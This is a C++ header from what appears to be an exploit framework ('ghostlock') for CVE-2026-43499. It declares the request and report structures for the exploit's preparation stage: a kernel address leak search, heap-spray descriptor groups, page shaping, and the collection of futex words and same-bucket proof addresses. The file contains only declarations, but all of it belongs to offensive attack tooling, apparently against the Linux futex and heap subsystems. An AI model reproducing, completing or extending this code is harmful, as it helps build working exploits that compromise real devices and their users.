#pragma once
/** @file backend/cve_2026_43499/steps/prepare_runner.hpp
 *  准备那一段的执行体：把搜索接上页准备，产出两个字（窗口要的那对 futex 字）。
 *
 *  配方照本树自己的 `tools/snitch_prepare_probe.cpp`：
 *    - 两个证明地址是**观察来的**（同桶），不是选的；
 *    - 队列字映射在自己的区域里；
 *    - `SnitchPolicy` 把搜索包成准备能问的 snitch；
 *    - `prepare_page(inputs, geometry, patience, policy)` 一次跑完，答案从它自己的 outcome 读。
 *
 *  设备专用（要 heap/snitch 两个 linux seam）。
 */
#include <cstddef>
#include <cstdint>

#include "backend/cve_2026_43499/leak/snitch_region.hpp"
#include "backend/cve_2026_43499/leak/snitch_run.hpp"
#include "backend/cve_2026_43499/leak/snitch_scan.hpp"
#include "backend/cve_2026_43499/leak/snitch_setup.hpp"
#include "backend/cve_2026_43499/memory/prepare_page.hpp"
#include "backend/cve_2026_43499/memory/prepare_plan.hpp"

#include "backend/cve_2026_43499/steps/words_region.hpp"

namespace ghostlock::backend::cve_2026_43499::steps {
    /** Everything the preparation needs, already mapped from the wire. */
    struct PrepareRequest final {
        leak::SnitchSetup setup{};
        leak::RegionInputs region{};
        leak::SnitchPatience patience{};
        leak::ScanStrides strides{};
        leak::ScanRange range{};
        std::size_t counter_offset = 0U;
        memory::PrepareInputs inputs{};
        memory::PageGeometry geometry{};
        memory::PreparePatience waiting{};
        /** 设备的页大小：几何里的对齐量由它推出。 */
        std::uint64_t page_size = 0U;
        /** The caller's words region: the words live past this call, so the caller owns them. */
        WordsRegion *words = nullptr;
        /** The proof addresses the runner fills: observed to share a bucket, never chosen. */
        std::uint64_t proofs[4] = {};
        /** Where the proof walk starts (the window start), and how many proofs to find. */
        std::uint64_t proof_seed = 0U;
        std::size_t proof_count = 0U;
    };

    /** What the preparation reported, from its own outcome. */
    struct PrepareReport final {
        const char *status = nullptr;
        int at_step = 0;
        std::size_t opened = 0U;
        std::size_t closed = 0U;
        std::uint64_t base = 0U;
        /** 选项 B 的通道：shaping 的发送端（-1 = 未交出 ⇒ 调用方按具名拒绝 ✓）。 */
        std::int32_t shaping_fd = -1;
        std::int32_t shaping_peer_fd = -1;
        int error = 0;
        /** The LeakLoop's own view, recorded in the unit before any reset. */
        std::uint8_t snitch_loop_saw = 0U;
        std::uint64_t snitch_loop_address = 0U;
        /** The search behind the LeakLoop, as it reported itself. */
        const char *snitch_verdict = nullptr;
        std::size_t snitch_probes = 0U;
        std::uint32_t snitch_rounds = 0U;
        std::uint64_t snitch_found = 0U;
        /** The per-group descriptor counts, so a gap can name its group. */
        std::size_t opened_pre = 0U;
        std::size_t opened_spray = 0U;
        std::size_t opened_post = 0U;
        std::size_t opened_leak = 0U;
        std::size_t closed_pre = 0U;
        std::size_t closed_spray = 0U;
        std::size_t closed_post = 0U;
        /** The proof addresses that were observed to share a bucket. */
        std::uint64_t proofs[4] = {};
        std::size_t proof_found = 0U;
    };

    /** Run one preparation. @return true when it ran (whatever status it reported), false with a
     *  named reason when it could not even start. */
    [[nodiscard]] bool run_prepare(PrepareRequest &request, PrepareReport &out,
                                   const char **refusal) noexcept;
}  // namespace ghostlock::backend::cve_2026_43499::steps
